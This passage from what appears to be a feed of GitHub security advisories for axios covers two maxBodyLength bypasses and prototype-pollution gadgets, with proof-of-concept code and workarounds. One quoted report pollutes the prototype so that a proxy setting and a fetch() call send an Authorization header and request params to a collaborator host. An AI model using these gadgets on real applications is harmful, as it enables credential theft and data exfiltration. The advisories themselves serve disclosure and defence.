-<ul>
-<li>Node.js HTTP adapter.</li>
-<li><code>httpVersion: 2</code>.</li>
-<li>Request <code>data</code> supplied as a stream.</li>
-<li>A finite <code>maxBodyLength</code>.</li>
-<li>Attacker-controlled or attacker-influenced stream contents.</li>
-</ul>
-<p>Unaffected or differently affected paths:</p>
-<ul>
-<li>String, Buffer, and ArrayBuffer request bodies are checked before transport selection.</li>
-<li>Browser XHR/fetch adapters are not affected.</li>
-<li>HTTP/1.1 requests using <code>follow-redirects</code> enforce <code>options.maxBodyLength</code>.</li>
-<li>In <code>axios &gt;=1.15.1</code>, setting <code>maxRedirects: 0</code> on affected HTTP/2 upload calls activates axios’ existing stream wrapper and rejects oversized streams.</li>
-</ul>
-<h2 id="technical-details">Technical Details</h2>
-<p>In <code>lib/adapters/http.js</code>, axios selects <code>http2Transport</code> whenever <code>httpVersion</code> resolves to <code>2</code>. The adapter still stores <code>config.maxBodyLength</code> on <code>options.maxBodyLength</code>, but Node’s HTTP/2 request API does not enforce that option.</p>
-<p>The stream-level byte-counting wrapper is currently gated on <code>config.maxBodyLength &gt; -1 &amp;&amp; config.maxRedirects === 0</code>. For HTTP/2 requests using the default redirect setting, axios does not use <code>follow-redirects</code> and also does not enter this wrapper, so <code>uploadStream.pipe(req)</code> sends the full stream.</p>
-<p>Local verification against the current <code>v1.x</code> checkout showed a request with <code>maxBodyLength: 1024</code> successfully transmitting <code>2097152</code> bytes over HTTP/2.</p>
-<p>No fixed release exists yet. The fix should enforce the byte-counting stream wrapper for HTTP/2 streamed uploads, not only for the native HTTP/1.1 <code>maxRedirects: 0</code> path.</p>
-<h2 id="proof-of-concept-of-attack">Proof of Concept of Attack</h2>
-<pre><code class="language-js">import http2 from 'node:http2';
-import {Readable} from 'node:stream';
-import axios from './index.js';
-
-const LIMIT = 1024;
-const PAYLOAD_BYTES = 2 * 1024 * 1024;
-
-const server = http2.createServer();
-
-server.on('stream', (stream) =&gt; {
-  let received = 0;
-
-  stream.on('data', (chunk) =&gt; {
-    received += chunk.length;
-  });
-
-  stream.on('end', () =&gt; {
-    stream.respond({':status': 200, 'content-type': 'application/json'});
-    stream.end(JSON.stringify({received, limit: LIMIT}));
-  });
-});
-
-await new Promise((resolve) =&gt; server.listen(0, '127.0.0.1', resolve));
-
-function makeBody(total) {
-  const chunk = Buffer.alloc(64 * 1024, 0x41);
-  let remaining = total;
-
-  return new Readable({
-    read() {
-      if (remaining &lt;= 0) {
-        this.push(null);
-        return;
-      }
-
-      const next = remaining &gt;= chunk.length ? chunk : chunk.subarray(0, remaining);
-      remaining -= next.length;
-      this.push(next);
-    }
-  });
-}
-
-try {
-  const response = await axios.post(
-    `http://127.0.0.1:${server.address().port}/upload`,
-    makeBody(PAYLOAD_BYTES),
-    {
-      httpVersion: 2,
-      maxBodyLength: LIMIT,
-      headers: {'content-type': 'application/octet-stream'}
-    }
-  );
-
-  console.log(response.data);
-  // Vulnerable result: { received: 2097152, limit: 1024 }
-} finally {
-  server.close();
-}
-</code></pre>
-<h2 id="workarounds">Workarounds</h2>
-<p>For <code>axios &gt;=1.15.1</code>, set <code>maxRedirects: 0</code> on affected HTTP/2 streamed upload calls. HTTP/2 redirects are not currently supported by the axios HTTP/2 adapter, so this is a practical per-call mitigation for this path.</p>
-<p>For earlier affected versions, pre-limit the stream with a byte-counting transform before passing it to axios, reject oversized uploads before forwarding them, or avoid <code>httpVersion: 2</code> for untrusted streamed uploads.### Summary
-On Node.js, axios's maxBodyLength is documented as a hard cap on outbound request bodies. For streamed uploads sent over httpVersion: 2, axios never enforces this cap: the entire body is transmitted regardless of size. Severity: medium.</p>
-<details>
-<summary>Original Report</summary>
-### Details
-In lib/adapters/http.js, transport selection is unconditional for HTTP/2:
-
-<p>http.js Lines 937-956</p>
-<pre><code>      if (isHttp2) {
-        transport = http2Transport;
-      } else {
-        const configTransport = own('transport');
-        if (configTransport) {
-          transport = configTransport;
-        } else if (config.maxRedirects === 0) {
-          transport = isHttpsRequest ? https : http;
-          isNativeTransport = true;
-        } else {
-          if (config.maxRedirects) {
-            options.maxRedirects = config.maxRedirects;
-          }
-          const configBeforeRedirect = own('beforeRedirect');
-          if (configBeforeRedirect) {
-            options.beforeRedirects.config = configBeforeRedirect;
-          }
-          transport = isHttpsRequest ? httpsFollow : httpFollow;
-        }
-      }
-</code></pre>
-<p>maxBodyLength is then stored on the request options:</p>
-<p>http.js Lines 958-963</p>
-<pre><code>      if (config.maxBodyLength &gt; -1) {
-        options.maxBodyLength = config.maxBodyLength;
-      } else {
-        // follow-redirects does not skip comparison, so it should always succeed for axios -1 unlimited
-        options.maxBodyLength = Infinity;
-      }
-</code></pre>
-<p>…but options.maxBodyLength is only honored by the follow-redirects transport. Node's native http2.request does not read it. The only stream-level cap in this file is the byte-counting Transform wrapper for streamed uploads, which is gated on config.maxRedirects === 0:</p>
-<p>http.js Lines 1270-1304</p>
-<pre><code>        // Enforce maxBodyLength for streamed uploads on the native http/https
-        // transport (maxRedirects === 0); follow-redirects enforces it on the
-        // other path.
-        let uploadStream = data;
-        if (config.maxBodyLength &gt; -1 &amp;&amp; config.maxRedirects === 0) {
-          const limit = config.maxBodyLength;
-          let bytesSent = 0;
-          uploadStream = stream.pipeline(
-            [
-              data,
-              new stream.Transform({
-                transform(chunk, _enc, cb) {
-                  bytesSent += chunk.length;
-                  if (bytesSent &gt; limit) {
-                    return cb(
-                      new AxiosError(
-                        'Request body larger than maxBodyLength limit',
-                        AxiosError.ERR_BAD_REQUEST,
-                        config,
-                        req
-                      )
-                    );
-                  }
-                  cb(null, chunk);
-                },
-              }),
-            ],
-            utils.noop
-          );
-          uploadStream.on('error', (err) =&gt; {
-            if (!req.destroyed) req.destroy(err);
-          });
-        }
-        uploadStream.pipe(req);
-</code></pre>
-<p>For the HTTP/2 path, neither branch fires: the http2Transport is always selected, and follow-redirects is never used. The byte-counting transform also doesn't fire unless the caller happens to pin maxRedirects: 0. As a result, uploadStream.pipe(req) streams the full body into the HTTP/2 request unbounded.</p>
-<h3 id="poc">PoC</h3>
-<pre><code>import http2 from 'node:http2';
-import { Readable } from 'node:stream';
-import axios from '../../index.js';
-
-const LIMIT = 1024;
-const PAYLOAD_BYTES = 2 * 1024 * 1024;
-
-// Cleartext HTTP/2 (h2c) server. http2.connect() supports h2c when given an
-// `http://...` authority, which mirrors what axios does when the request URL
-// uses `http://` and `httpVersion: 2`.
-const server = http2.createServer();
-
-server.on('stream', (stream, _headers) =&gt; {
-  let received = 0;
-  stream.on('data', (chunk) =&gt; {
-    received += chunk.length;
-  });
-  stream.on('end', () =&gt; {
-    stream.respond({
-      ':status': 200,
-      'content-type': 'application/json',
-    });
-    stream.end(JSON.stringify({ received, limit: LIMIT }));
-  });
-  stream.on('error', () =&gt; {
-    /* swallow client-side aborts */
-  });
-});
-
-await new Promise((resolve) =&gt; server.listen(0, '127.0.0.1', resolve));
-const port = server.address().port;
-
-function makeBodyStream(totalBytes) {
-  const CHUNK = Buffer.alloc(64 * 1024, 0x41);
-  let remaining = totalBytes;
-  return new Readable({
-    read() {
-      if (remaining &lt;= 0) {
-        this.push(null);
-        return;
-      }
-      const next = remaining &gt;= CHUNK.length ? CHUNK : CHUNK.subarray(0, remaining);
-      remaining -= next.length;
-      this.push(next);
-    },
-  });
-}
-
-try {
-  let result;
-  try {
-    const response = await axios.post(`http://127.0.0.1:${port}/upload`, makeBodyStream(PAYLOAD_BYTES), {
-      httpVersion: 2,
-      maxBodyLength: LIMIT,
-      // We intentionally do NOT set maxRedirects: 0 — that flag activates the
-      // existing HTTP/1 byte-counting wrapper. The bug under test is that the
-      // HTTP/2 transport path skips that wrapper entirely.
-      headers: { 'content-type': 'application/octet-stream' },
-      // Omit content-length so the body is streamed without a known length.
-    });
-    result = { status: response.status, data: response.data };
-  } catch (err) {
-    result = { error: err &amp;&amp; (err.code || err.message) };
-  }
-
-  console.log('--- PoC: HTTP/2 maxBodyLength bypass ---');
-  console.log('axios result:', JSON.stringify(result));
-
-  const ok =
-    result &amp;&amp;
-    result.status === 200 &amp;&amp;
-    result.data &amp;&amp;
-    typeof result.data === 'object' &amp;&amp;
-    result.data.received === PAYLOAD_BYTES &amp;&amp;
-    result.data.limit === LIMIT;
-
-  if (ok) {
-    console.log(
-      `VULNERABLE: server received ${result.data.received} bytes despite ` +
-        `maxBodyLength=${LIMIT}.`
-    );
-    process.exitCode = 0;
-  } else {
-    console.log('NOT VULNERABLE: axios refused or truncated the oversized stream.');
-    process.exitCode = 1;
-  }
-} finally {
-  server.close();
-  // http2 sessions cached by axios may keep the event loop alive; force exit
-  // after the assertion so the script returns instead of idling on TCP keep-alive.
-  setImmediate(() =&gt; process.exit(process.exitCode || 0));
-}
-</code></pre>
-<h3 id="impact-1">Impact</h3>
-<ul>
-<li>Uncontrolled outbound egress: an attacker who controls the upstream stream (e.g. via an upload endpoint that pipes into axios) can force the application to transmit arbitrarily large payloads.</li>
-<li>Bypass of cost/quota guards configured via maxBodyLength against billed upstream services.</li>
-<li>Resource exhaustion against upstream peers, proxies, and the application's own connection / memory budget.</li></ul></details>
-
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/axios/axios/security/advisories/GHSA-mwf2-3pr3-8698">https://github.com/axios/axios/security/advisories/GHSA-mwf2-3pr3-8698</a></li>
-<li><a href="https://github.com/axios/axios/pull/11000">https://github.com/axios/axios/pull/11000</a></li>
-<li><a href="https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2">https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2</a></li>
-<li><a href="https://github.com/axios/axios/releases/tag/v1.18.0">https://github.com/axios/axios/releases/tag/v1.18.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-mwf2-3pr3-8698">https://github.com/advisories/GHSA-mwf2-3pr3-8698</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mwf2-3pr3-8698</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T22:37:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[axios] Axios: Fetch adapter `ReadableStream` uploads bypass `maxBodyLength`]]></title>
-        <id>https://github.com/advisories/GHSA-jqh4-m9w3-8hp9</id>
-        <link href="https://github.com/advisories/GHSA-jqh4-m9w3-8hp9"/>
-        <updated>2026-07-20T22:27:13.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>axios’ fetch adapter does not enforce <code>maxBodyLength</code> for live WHATWG <code>ReadableStream</code> request bodies whose size cannot be determined before dispatch. Applications that use <code>adapter: "fetch"</code> and rely on <code>maxBodyLength</code> to cap untrusted upload/proxy streams can send the full stream even when it exceeds the configured limit.</p>
-<p>This affects fetch-adapter usage in edge runtimes where fetch is selected, and in Node.js or browser environments where the fetch adapter is explicitly selected. The HTTP adapter’s stream upload path is not affected.</p>
-<h2 id="impact">Impact</h2>
-<p>An attacker who can supply or influence a streamed request body can bypass the caller’s configured upload-size limit. Practical impact is unexpected outbound network egress, request-level resource consumption, and possible exhaustion of upstream API quotas or bandwidth.</p>
-<p>This does not expose response data, execute code, or modify axios configuration. Exploitability depends on an application passing attacker-controlled, unknown-length stream data to axios and relying on <code>maxBodyLength</code> as the size guard.</p>
-<h2 id="affected-functionality">Affected Functionality</h2>
-<p>Affected:</p>
-<ul>
-<li><code>adapter: "fetch"</code> or environments where axios selects the fetch adapter.</li>
-<li>Request methods with bodies, such as <code>POST</code>, <code>PUT</code>, and <code>PATCH</code>.</li>
-<li><code>data</code> as a WHATWG <code>ReadableStream</code> without a reliable <code>Content-Length</code>.</li>
-<li>Configurations that set <code>maxBodyLength</code> to a finite value.</li>
-</ul>
-<p>Not affected:</p>
-<ul>
-<li>Axios versions before the fetch adapter was introduced.</li>
-<li>The Node HTTP adapter stream enforcement path.</li>
-<li>Known-length fetch-adapter bodies in <code>1.16.0+</code>, such as strings, <code>Blob</code>, <code>ArrayBuffer</code>, <code>ArrayBufferView</code>, URLSearchParams, spec-compliant FormData, or requests with a finite <code>Content-Length</code>.</li>
-</ul>
-<h2 id="technical-details">Technical Details</h2>
-<p>In <code>lib/adapters/fetch.js</code>, <code>getBodyLength()</code> handles null bodies, <code>Blob</code>, spec-compliant FormData, ArrayBuffer values, URLSearchParams, and strings. It has no branch for <code>ReadableStream</code>, so <code>resolveBodyLength(headers, data)</code> returns <code>undefined</code> when no finite <code>Content-Length</code> header is present.</p>
-<p>The <code>maxBodyLength</code> check only throws when the resolved outbound length is a finite number greater than the configured limit. For live streams, the check is skipped and the stream is passed to <code>fetch()</code>.</p>
-<p>When <code>onUploadProgress</code> is enabled, axios wraps the request body with <code>trackStream()</code>, but that wrapper only reports progress. It does not receive <code>maxBodyLength</code> and does not abort once loaded bytes exceed the cap.</p>
-<p>The expected behavior exists in the HTTP adapter: <code>lib/adapters/http.js</code> enforces <code>maxBodyLength</code> for streamed uploads by counting chunks and rejecting with <code>ERR_BAD_REQUEST</code>.</p>
-<h2 id="proof-of-concept-of-attack">Proof of Concept of Attack</h2>
-<p>Run from the axios repo root on Node 18+ against an affected version:</p>
-<pre><code class="language-js">import http from 'node:http';
-import axios from './index.js';
-
-const LIMIT = 1024;
-const PAYLOAD_BYTES = 2 * 1024 * 1024;
-
-const server = http.createServer((req, res) =&gt; {
-  let received = 0;
-  req.on('data', (chunk) =&gt; {
-    received += chunk.length;
-  });
-  req.on('end', () =&gt; {
-    res.writeHead(200, { 'content-type': 'application/json' });
-    res.end(JSON.stringify({ received, limit: LIMIT }));
-  });
-});
-
-await new Promise((resolve) =&gt; server.listen(0, '127.0.0.1', resolve));
-const { port } = server.address();
-
-function makeReadableStream(totalBytes) {
-  const chunk = new Uint8Array(64 * 1024).fill(0x42);
-  let remaining = totalBytes;
-
-  return new ReadableStream({
-    pull(controller) {
-      if (remaining &lt;= 0) {
-        controller.close();
-        return;
-      }
-
-      const next = remaining &gt;= chunk.length ? chunk : chunk.subarray(0, remaining);
-      remaining -= next.length;
-      controller.enqueue(next);
-    },
-  });
-}
-
-try {
-  const response = await axios.post(
-    `http://127.0.0.1:${port}/upload`,
-    makeReadableStream(PAYLOAD_BYTES),
-    {
-      adapter: 'fetch',
-      maxBodyLength: LIMIT,
-      headers: { 'content-type': 'application/octet-stream' },
-    }
-  );
-
-  console.log(response.data);
-} finally {
-  server.close();
-}
-</code></pre>
-<p>Expected vulnerable result: the server reports <code>received: 2097152</code> even though <code>maxBodyLength</code> is <code>1024</code>.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Use the HTTP adapter for untrusted stream uploads in Node.js where possible, or wrap/count the stream at the application layer and abort it when it exceeds the intended limit. Do not rely on fetch-adapter <code>maxBodyLength</code> for unknown-length <code>ReadableStream</code> bodies until a fixed axios version is available.</p>
-<details>
-<summary>Original Report</summary>
-
-<h3 id="summary-1">Summary</h3>
-<p>axios's fetch adapter (used in browsers, edge runtimes, and Node 18+ when explicitly selected) ignores maxBodyLength for live ReadableStream request bodies whose size cannot be inferred ahead of dispatch. The pre-dispatch check is skipped when the length is unknown, and the in-flight wrapper that runs during transmission only emits progress events — it never enforces a byte cap. Severity: medium.</p>
-<h3 id="details">Details</h3>
-<p>In lib/adapters/fetch.js, body-length resolution has no ReadableStream branch:</p>
-<p>fetch.js Lines 121-155</p>
-<pre><code>  const getBodyLength = async (body) =&gt; {
-    if (body == null) {
-      return 0;
-    }
-    if (utils.isBlob(body)) {
-      return body.size;
-    }
-    if (utils.isSpecCompliantForm(body)) {
-      const _request = new Request(platform.origin, {
-        method: 'POST',
-        body,
-      });
-      return (await _request.arrayBuffer()).byteLength;
-    }
-    if (utils.isArrayBufferView(body) || utils.isArrayBuffer(body)) {
-      return body.byteLength;
-    }
-    if (utils.isURLSearchParams(body)) {
-      body = body + '';
-    }
-    if (utils.isString(body)) {
-      return (await encodeText(body)).byteLength;
-    }
-  };
-  const resolveBodyLength = async (headers, body) =&gt; {
-    const length = utils.toFiniteNumber(headers.getContentLength());
-    return length == null ? getBodyLength(body) : length;
-  };
-</code></pre>
-<p>For a live ReadableStream, resolveBodyLength returns undefined. The pre-dispatch maxBodyLength check then short-circuits because the value is not finite:</p>
-<p>fetch.js Lines 214-232</p>
-<pre><code>      // Enforce maxBodyLength against the outbound request body before dispatch.
-      // Mirrors http.js behavior (ERR_BAD_REQUEST / 'Request body larger than
-      // maxBodyLength limit'). Skip when the body length cannot be determined
-      // (e.g. a live ReadableStream supplied by the caller).
-      if (hasMaxBodyLength &amp;&amp; method !== 'get' &amp;&amp; method !== 'head') {
-        const outboundLength = await resolveBodyLength(headers, data);
-        if (
-          typeof outboundLength === 'number' &amp;&amp;
-          isFinite(outboundLength) &amp;&amp;
-          outboundLength &gt; maxBodyLength
-        ) {
-          throw new AxiosError(
-            'Request body larger than maxBodyLength limit',
-            AxiosError.ERR_BAD_REQUEST,
-            config,
-            request
-          );
-        }
-      }
-</code></pre>
-<p>The in-flight stream wrapper that follows is purely for progress reporting; it neither sees maxBodyLength nor aborts the request when bytes exceed any cap:</p>
-<p>fetch.js Lines 253-261</p>
-<pre><code>        if (_request.body) {
-          const [onProgress, flush] = progressEventDecorator(
-            requestContentLength,
-            progressEventReducer(asyncDecorator(onUploadProgress))
-          );
-          data = trackStream(_request.body, DEFAULT_CHUNK_SIZE, onProgress, flush);
-        }
-</code></pre>
-<p>The body therefore reaches fetch() unbounded, and the entire payload is transmitted regardless of maxBodyLength.</p>
-<h3 id="poc">PoC</h3>
-<pre><code>import http from 'node:http';
-import axios from '../../index.js';
-
-const LIMIT = 1024;
-const PAYLOAD_BYTES = 2 * 1024 * 1024;
-
-const server = http.createServer((req, res) =&gt; {
-  let received = 0;
-  req.on('data', (chunk) =&gt; {
-    received += chunk.length;
-  });
-  req.on('end', () =&gt; {
-    res.writeHead(200, { 'content-type': 'application/json' });
-    res.end(JSON.stringify({ received, limit: LIMIT }));
-  });
-  req.on('error', () =&gt; {
-    /* swallow client-side aborts */
-  });
-});
-
-await new Promise((resolve) =&gt; server.listen(0, '127.0.0.1', resolve));
-const port = server.address().port;
-
-function makeReadableStream(totalBytes) {
-  const CHUNK = new Uint8Array(64 * 1024).fill(0x42);
-  let remaining = totalBytes;
-  return new ReadableStream({
-    pull(controller) {
-      if (remaining &lt;= 0) {
-        controller.close();
-        return;
-      }
-      const next = remaining &gt;= CHUNK.length ? CHUNK : CHUNK.subarray(0, remaining);
-      remaining -= next.length;
-      controller.enqueue(next);
-    },
-  });
-}
-
-try {
-  let result;
-  try {
-    const response = await axios.post(
-      `http://127.0.0.1:${port}/upload`,
-      makeReadableStream(PAYLOAD_BYTES),
-      {
-        adapter: 'fetch',
-        maxBodyLength: LIMIT,
-        headers: { 'content-type': 'application/octet-stream' },
-        // No content-length: the stream's total length is unknown ahead of
-        // dispatch, which is exactly the vulnerable code path.
-      }
-    );
-    result = { status: response.status, data: response.data };
-  } catch (err) {
-    result = { error: err &amp;&amp; (err.code || err.message) };
-  }
-
-  console.log('--- PoC: fetch adapter ReadableStream maxBodyLength bypass ---');
-  console.log('axios result:', JSON.stringify(result));
-
-  const ok =
-    result &amp;&amp;
-    result.status === 200 &amp;&amp;
-    result.data &amp;&amp;
-    typeof result.data === 'object' &amp;&amp;
-    result.data.received === PAYLOAD_BYTES &amp;&amp;
-    result.data.limit === LIMIT;
-
-  if (ok) {
-    console.log(
-      `VULNERABLE: server received ${result.data.received} bytes despite ` +
-        `maxBodyLength=${LIMIT}.`
-    );
-    process.exitCode = 0;
-  } else {
-    console.log('NOT VULNERABLE: axios refused or truncated the oversized ReadableStream.');
-    process.exitCode = 1;
-  }
-} finally {
-  server.close();
-}
-</code></pre>
-<h3 id="impact-1">Impact</h3>
-<ul>
-<li>Uncontrolled egress when proxying user-controlled streams (e.g. file uploads, log forwarding, AI streaming endpoints).</li>
-<li>Bypass of cost / quota guards on upstream APIs.</li>
-<li>Resource exhaustion against the runtime's network stack and against upstream peers.</li></ul></details>
-
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/axios/axios/security/advisories/GHSA-jqh4-m9w3-8hp9">https://github.com/axios/axios/security/advisories/GHSA-jqh4-m9w3-8hp9</a></li>
-<li><a href="https://github.com/axios/axios/pull/11000">https://github.com/axios/axios/pull/11000</a></li>
-<li><a href="https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2">https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2</a></li>
-<li><a href="https://github.com/axios/axios/releases/tag/v1.18.0">https://github.com/axios/axios/releases/tag/v1.18.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-jqh4-m9w3-8hp9">https://github.com/advisories/GHSA-jqh4-m9w3-8hp9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jqh4-m9w3-8hp9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T22:27:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[axios] Axios: Prototype pollution gadgets can alter axios request construction]]></title>
-        <id>https://github.com/advisories/GHSA-mmx7-hfxf-jppx</id>
-        <link href="https://github.com/advisories/GHSA-mmx7-hfxf-jppx"/>
-        <updated>2026-07-20T22:25:08.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>axios is vulnerable to read-side prototype-pollution gadgets when <code>Object.prototype</code> has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: <code>axios.get()</code>, <code>axios.delete()</code>, <code>axios.head()</code>, and <code>axios.options()</code> read inherited <code>data</code> before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.</p>
-<p>Additional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited <code>proxy</code> or <code>paramsSerializer</code> values can influence request routing or URL serialization. These low-level paths are not reproduced through normal <code>axios.get()</code> usage on <code>1.15.2+</code>.</p>
-<h2 id="impact">Impact</h2>
-<p>An attacker who can first pollute <code>Object.prototype</code> can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on <code>GET</code>, <code>DELETE</code>, <code>HEAD</code>, or <code>OPTIONS</code>.</p>
-<p>For direct low-level Node HTTP adapter usage, inherited <code>proxy</code> can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.</p>
-<p>For direct <code>resolveConfig</code> or browser-adapter helper usage, inherited <code>paramsSerializer</code> can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on <code>1.15.2+</code>.</p>
-<h2 id="affected-functionality">Affected Functionality</h2>
-<p>Affected normal API:</p>
-<ul>
-<li><code>axios.get(url[, config])</code></li>
-<li><code>axios.delete(url[, config])</code></li>
-<li><code>axios.head(url[, config])</code></li>
-<li><code>axios.options(url[, config])</code></li>
-</ul>
-<p>Affected low-level usage:</p>
-<ul>
-<li>Direct calls to <code>axios/lib/adapters/http.js</code> or <code>axios/unsafe/adapters/http.js</code> with plain configs and no own <code>proxy</code>.</li>
-<li>Direct calls to <code>axios/unsafe/helpers/resolveConfig.js</code> or direct browser adapter/helper paths with plain configs and no own <code>paramsSerializer</code>.</li>
-</ul>
-<p>Unaffected or corrected scope:</p>
-<ul>
-<li>Normal <code>axios.get()</code> calls on <code>1.15.2+</code> did not reproduce the <code>proxy</code> or <code>paramsSerializer</code> gadgets because <code>mergeConfig()</code> returns a null-prototype config and uses own-property reads.</li>
-</ul>
-<h2 id="technical-details">Technical Details</h2>
-<p><code>lib/core/Axios.js</code> constructs aliases for bodyless methods and copies <code>data</code> with <code>(config || {}).data</code> before config normalization. If <code>Object.prototype.data</code> is polluted, this inherited value becomes an own <code>data</code> property in the merged request config and is sent by the adapter.</p>
-<p><code>lib/core/mergeConfig.js</code> in <code>1.15.2+</code> returns a null-prototype config and uses <code>hasOwnProp</code> guards, which prevents normal high-level requests from inheriting polluted <code>proxy</code> and <code>paramsSerializer</code> values after merge. This is why those two reporter claims do not reproduce through normal <code>axios.get()</code> on <code>1.15.2</code> or <code>1.16.1</code>.</p>
-<p>The low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of <code>config.proxy</code> in the Node HTTP adapter and <code>config.paramsSerializer</code> in affected <code>resolveConfig()</code> versions can consume inherited polluted values.</p>
-<h2 id="proof-of-concept-of-attack">Proof of Concept of Attack</h2>
-<pre><code class="language-js">import http from 'http';
-import axios from 'axios';
-
-const server = http.createServer((req, res) =&gt; {
-  let body = '';
-
-  req.on('data', chunk =&gt; {
-    body += chunk;
-  });
-
-  req.on('end', () =&gt; {
-    res.writeHead(200, {'content-type': 'application/json'});
-    res.end(JSON.stringify({body, headers: req.headers}));
-  });
-});
-
-await new Promise(resolve =&gt; server.listen(0, '127.0.0.1', resolve));
-
-Object.prototype.data = 'INJECTED';
-
-try {
-  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);
-
-  console.log(res.data.body); // "INJECTED"
-  console.log(res.data.headers['content-length']); // "8"
-} finally {
-  delete Object.prototype.data;
-  await new Promise(resolve =&gt; server.close(resolve));
-}
-</code></pre>
-<p>Expected result: a request body is sent even though the caller did not explicitly set <code>config.data</code>.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Avoid processing untrusted input with libraries or code paths that can pollute <code>Object.prototype</code>. As a defense-in-depth mitigation before an axios fix is available, explicitly pass <code>data: undefined</code> on bodyless method aliases when running in a process where prototype pollution is a concern.</p>
-<details>
-<summary>Original Report</summary>
-
-<h3 id="summary-1">Summary</h3>
-<p>Three prototype pollution read-side gadgets in axios bypass the <code>own()</code> hasOwnProp guard pattern, allowing a polluted <code>Object.prototype</code> to hijack outbound requests.</p>
-<h3 id="details">Details</h3>
-<p>The <a href="https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L342"><code>own()</code> helper</a> was introduced after GHSA-q8qp-cvcw-x6jj to prevent polluted prototype properties from reaching security-sensitive config reads. Three paths were missed:</p>
-<p><code>config.proxy</code> at <a href="https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L715">http.js:715</a> goes straight into <a href="https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L197"><code>setProxy()</code></a>. A polluted <code>Object.prototype.proxy</code> reroutes outbound requests through an attacker-controlled proxy, exposing Authorization headers and full request URLs.</p>
-<p><code>(config || {}).data</code> at <a href="https://github.com/axios/axios/blob/v1.15.2/lib/core/Axios.js#L248">Axios.js:248</a> covers GET, HEAD, DELETE, OPTIONS. Even without explicit body, polluted value becomes the body. I got injected payloads on 3 of 4 method types in testing.</p>
-<p><code>config.paramsSerializer</code> at <a href="https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L32">resolveConfig.js:32</a> is three lines below the <a href="https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L15"><code>own()</code> definition that was supposed to protect it</a>. A polluted  function onto <code>Object.prototype.paramsSerializer</code> gets called with the request params on every request that has query strings.</p>
-<p>I read up on the threat model and I believe T-R4b identifies this exact class and notes that config-read paths must use <code>hasOwnProp</code> guards. These three seem to predate or were missed by that coverage.</p>
-<h3 id="poc">PoC</h3>
-<p>Ran against <code>axios@1.15.2</code> on <code>node:22-slim</code> in Docker. Clean install, no other deps.</p>
-<pre><code class="language-javascript">import axios from 'axios';
-
-// gadget 1 - proxy
-Object.prototype.proxy = { host: 'yourcollab.oastify.com', port: 8080, protocol: 'http' };
-await axios.get('https://api.example.com/user', { headers: { Authorization: 'Bearer sk-test-1234567890' } });
-// check collaborator - request arrives with full path + auth header
-</code></pre>
-<pre><code class="language-javascript">// gadget 2 - data on bodyless methods
-Object.prototype.data = '{"injected":true}';
-await axios.get('https://api.example.com/items');
-await axios.delete('https://api.example.com/items/1');
-await axios.head('https://api.example.com/items');
-// 3/4 methods send the polluted body
-</code></pre>
-<pre><code class="language-javascript">// gadget 3 - paramsSerializer
-Object.prototype.paramsSerializer = (p) =&gt; {
-  fetch('https://yourcollab.oastify.com/?' + new URLSearchParams(p));
-  return 'q=x';
-};
-await axios.get('https://api.example.com/search', { params: { token: 'secret' } });
-</code></pre>
-<h3 id="impact-1">Impact</h3>
-<p>Any app with a polluted prototype (common via transitive deps like lodash, qs, minimist) should be affected. Gadget 1 steals credentials and redirects traffic. Gadget 2 corrupts request semantics. Gadget 3 gives the attacker arbitrary control over URL construction and a data exfiltration channel. All three fire silently on normal application code that never touches proxy, data, or <code>paramsSerializer</code> directly.</p>
-</details>
-### References
-
-<ul>
-<li><a href="https://github.com/axios/axios/security/advisories/GHSA-mmx7-hfxf-jppx">https://github.com/axios/axios/security/advisories/GHSA-mmx7-hfxf-jppx</a></li>
-<li><a href="https://github.com/axios/axios/pull/11000">https://github.com/axios/axios/pull/11000</a></li>
-<li><a href="https://github.com/axios/axios/pull/11001">https://github.com/axios/axios/pull/11001</a></li>
-<li><a href="https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d">https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d</a></li>
-<li><a href="https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2">https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2</a></li>
-<li><a href="https://github.com/axios/axios/releases/tag/v0.33.0">https://github.com/axios/axios/releases/tag/v0.33.0</a></li>
